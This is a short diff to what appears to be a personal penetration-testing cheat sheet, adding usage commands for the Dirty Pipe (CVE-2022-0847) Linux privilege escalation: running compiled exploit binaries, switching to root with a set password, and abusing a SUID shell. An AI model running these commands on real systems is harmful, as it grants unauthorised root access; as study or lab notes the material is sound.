@@ -1,5 +1,9 @@
 
 ##  DirtyPipe - CVE-2022-0847
-./dpipe-root 
-su h4rith
 
+```bash
+./dpipe-root
+su root ## Password is h4rithd
+
+./dpipe-suid $(which dash)
+```
